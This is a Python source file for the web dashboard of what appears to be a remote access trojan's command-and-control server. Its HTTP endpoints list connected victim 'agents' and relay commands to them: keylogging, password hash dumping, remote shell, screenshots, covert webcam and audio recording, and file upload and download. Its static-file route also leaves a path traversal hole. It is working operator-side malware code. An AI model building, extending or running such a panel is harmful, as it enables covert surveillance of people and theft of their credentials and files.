import json
import logging
import mimetypes
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from server.core import Server

logger = logging.getLogger(__name__)
_server_instance: "Server" = None
_templates_dir = os.path.join(os.path.dirname(__file__), "web", "templates")
_static_dir = os.path.join(os.path.dirname(__file__), "web", "static")


def set_server(server: "Server") -> None:
    global _server_instance
    _server_instance = server


class WebHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        logger.debug("%s - %s", self.address_string(), format % args)

    def _send_json(self, data: dict, status: int = 200):
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_file(self, filepath: str):
        mime_type, _ = mimetypes.guess_type(filepath)
        if mime_type is None:
            mime_type = "application/octet-stream"
        try:
            with open(filepath, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", mime_type)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404)

    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self._send_file(os.path.join(_templates_dir, "index.html"))
        elif self.path == "/api/agents":
            self._serve_agents()
        elif self.path == "/api/stats":
            self._serve_stats()
        elif self.path.startswith("/static/"):
            filepath = os.path.join(_static_dir, self.path[8:])
            self._send_file(filepath)
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path.startswith("/api/agents/"):
            path_part = self.path[12:].split("?")[0]
            parts = path_part.split("/")
            if len(parts) >= 2:
                agent_id = parts[0]
                action = parts[1]
                if action == "test":
                    self._handle_test(agent_id)
                elif action == "disconnect":
                    self._handle_disconnect(agent_id)
                elif action == "download":
                    self._handle_download(agent_id)
                elif action == "upload":
                    self._handle_upload(agent_id)
                elif action == "webcam":
                    if len(parts) >= 3:
                        webcam_action = parts[2]
                        if webcam_action == "snapshot":
                            self._handle_webcam_snapshot(agent_id)
                        elif webcam_action == "stream":
                            self._handle_webcam_stream(agent_id)
                        else:
                            self._send_json({"success": False, "error": f"Unknown webcam action: {webcam_action}"}, 400)
                    else:
                        self._send_json({"success": False, "error": "Missing webcam action (snapshot or stream)"}, 400)
                elif action == "screenshot":
                    self._handle_generic_command(agent_id, "screenshot")
                elif action == "keylogger":
                    self._handle_generic_command(agent_id, "keylogger")
                elif action == "shell":
                    self._handle_generic_command(agent_id, "shell")
                elif action == "hashdump":
                    self._handle_generic_command(agent_id, "hashdump")
                elif action == "ipconfig":
                    self._handle_generic_command(agent_id, "ipconfig")
                elif action == "record_audio":
                    self._handle_generic_command(agent_id, "record_audio")
                elif action == "search":
                    self._handle_generic_command(agent_id, "search")
                else:
                    self._send_json({"success": False, "error": f"Unknown action: {action}"}, 400)
            else:
                self._send_json({"success": False, "error": "Invalid path"}, 400)
        elif self.path == "/api/configure":
            self._handle_configure()
        elif self.path == "/api/shutdown":
            self._handle_shutdown()
        else:
            self.send_error(404)

    def _read_json_body(self):
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            return {}
        body = self.rfile.read(length)
        return json.loads(body.decode())

    def _handle_test(self, agent_id: str):
        if _server_instance is None:
            self._send_json({"success": False, "error": "Server not ready"}, 500)
            return
        with _server_instance.lock:
            if agent_id not in _server_instance.sessions:
                self._send_json({"success": False, "error": "Agent not found"}, 404)
                return
        try:
            _server_instance.send_test_to_agent(agent_id)
            self._send_json({"success": True})
        except Exception as e:
            self._send_json({"success": False, "error": str(e)}, 500)

    def _handle_disconnect(self, agent_id: str):
        if _server_instance is None:
            self._send_json({"success": False, "error": "Server not ready"}, 500)
            return
        with _server_instance.lock:
            session = _server_instance.sessions.pop(agent_id, None)
            sock = session.socket if session else None
        if sock:
            try:
                sock.close()
            except OSError:
                pass
            self._send_json({"success": True})
        else:
            self._send_json({"success": False, "error": "Agent not found"}, 404)

    def _handle_download(self, agent_id: str):
        if _server_instance is None:
            self._send_json({"success": False, "error": "Server not ready"}, 500)
            return
        try:
            data = self._read_json_body()
            remote_path = data.get("remote_path")
            local_path = data.get("local_path")
            if not remote_path or not local_path:
                self._send_json({"success": False, "error": "Missing paths"}, 400)
                return
            with _server_instance.lock:
                if agent_id not in _server_instance.sessions:
                    self._send_json({"success": False, "error": "Agent not found"}, 404)
                    return
            success = _server_instance.download_from_agent(agent_id, remote_path, local_path)
            self._send_json({"success": success})
        except Exception as e:
            self._send_json({"success": False, "error": str(e)}, 500)

    def _handle_upload(self, agent_id: str):
        if _server_instance is None:
            self._send_json({"success": False, "error": "Server not ready"}, 500)
            return
        try:
            data = self._read_json_body()
            local_path = data.get("local_path")
            remote_path = data.get("remote_path")
            if not local_path or not remote_path:
                self._send_json({"success": False, "error": "Missing paths"}, 400)
                return
            with _server_instance.lock:
                if agent_id not in _server_instance.sessions:
                    self._send_json({"success": False, "error": "Agent not found"}, 404)
                    return
            success = _server_instance.upload_to_agent(agent_id, local_path, remote_path)
            self._send_json({"success": success})
        except Exception as e:
            self._send_json({"success": False, "error": str(e)}, 500)

    def _serve_agents(self):
        if _server_instance is None:
            self._send_json({"agents": []})
            return
        with _server_instance.lock:
            agents = []
            for session in _server_instance.sessions.values():
                agents.append({
                    "id": session.agent_id,
                    "ip": session.address[0],
                    "port": session.address[1],
                    "os": session.os_type or "unknown",
                    "uptime": session.session_duration,
                    "idle": session.idle_time,
                })
        self._send_json({"agents": agents})

    def _serve_stats(self):
        if _server_instance is None:
            self._send_json({"active": 0, "max": 0, "unique_ips": 0, "banned_count": 0})
            return
        stats = _server_instance._rate_limiter.get_stats()
        with _server_instance.lock:
            active = len(_server_instance.sessions)
        self._send_json({
            "active": active,
            "max": stats["max_total_connections"],
            "unique_ips": stats["unique_ips_connected"],
            "banned_count": len(stats["banned_ips"]),
        })

    def _handle_configure(self):
        if _server_instance is None:
            self._send_json({"success": False, "error": "Server not ready"}, 500)
            return
        try:
            data = self._read_json_body()
            setting = data.get("setting")
            value_str = data.get("value")
            if not setting or not value_str:
                self._send_json({"success": False, "error": "Missing setting or value"}, 400)
                return
            try:
                value = int(value_str)
            except ValueError:
                self._send_json({"success": False, "error": "Value must be integer"}, 400)
                return
            if setting == "max_file_size_in_bytes":
                if value <= 0:
                    self._send_json({"success": False, "error": "Must be positive"}, 400)
                    return
                _server_instance.max_file_size = value
            elif setting == "max_connections_per_ip_per_minute":
                if value <= 0:
                    self._send_json({"success": False, "error": "Must be positive"}, 400)
                    return
                _server_instance._rate_limiter.max_connections_per_ip_per_minute = value
            elif setting == "max_concurrent_connections_per_ip":
                if value <= 0:
                    self._send_json({"success": False, "error": "Must be positive"}, 400)
                    return
                _server_instance._rate_limiter.max_concurrent_per_ip = value
            elif setting == "max_total_connections":
                if value <= 0:
                    self._send_json({"success": False, "error": "Must be positive"}, 400)
                    return
                _server_instance._rate_limiter.max_total_connections = value
            elif setting == "rate_limit_ban_seconds":
                if value < 0:
                    self._send_json({"success": False, "error": "Must be non-negative"}, 400)
                    return
                _server_instance._rate_limiter.ban_duration_seconds = value
            else:
                self._send_json({"success": False, "error": "Unknown setting"}, 400)
                return
            self._send_json({"success": True})
        except Exception as e:
            self._send_json({"success": False, "error": str(e)}, 500)

    def _handle_shutdown(self):
        self._send_json({"success": True})
        _server_instance.running = False

    def _handle_webcam_snapshot(self, agent_id: str):
        if _server_instance is None:
            self._send_json({"success": False, "error": "Server not ready"}, 500)
            return
        try:
            data = self._read_json_body()
            camera = data.get("camera", 0)
            with _server_instance.lock:
                if agent_id not in _server_instance.sessions:
                    self._send_json({"success": False, "error": "Agent not found"}, 404)
                    return
            result = _server_instance.send_command_to_agent(agent_id, "webcam_snapshot", {"camera": camera})
            self._send_json(result)
        except Exception as e:
            self._send_json({"success": False, "error": str(e)}, 500)

    def _handle_webcam_stream(self, agent_id: str):
        if _server_instance is None:
            self._send_json({"success": False, "error": "Server not ready"}, 500)
            return
        try:
            data = self._read_json_body()
            action = data.get("action", "status")
            with _server_instance.lock:
                if agent_id not in _server_instance.sessions:
                    self._send_json({"success": False, "error": "Agent not found"}, 404)
                    return
            result = _server_instance.send_command_to_agent(agent_id, "webcam_stream", data)
            self._send_json(result)
        except Exception as e:
            self._send_json({"success": False, "error": str(e)}, 500)

    def _handle_generic_command(self, agent_id: str, command: str):
        if _server_instance is None:
            self._send_json({"success": False, "error": "Server not ready"}, 500)
            return
        try:
            data = self._read_json_body()
            with _server_instance.lock:
                if agent_id not in _server_instance.sessions:
                    self._send_json({"success": False, "error": "Agent not found"}, 404)
                    return
            result = _server_instance.send_command_to_agent(agent_id, command, data)
            self._send_json(result)
        except Exception as e:
            self._send_json({"success": False, "error": str(e)}, 500)


def start_web_server(host: str, port: int, server: "Server") -> HTTPServer:
    set_server(server)
    httpd = HTTPServer((host, port), WebHandler)
    thread = threading.Thread(target=lambda: httpd.serve_forever(poll_interval=0.1), daemon=True)
    thread.start()
    logger.info(f"Web interface started on http://{host}:{port}")
    return httpd
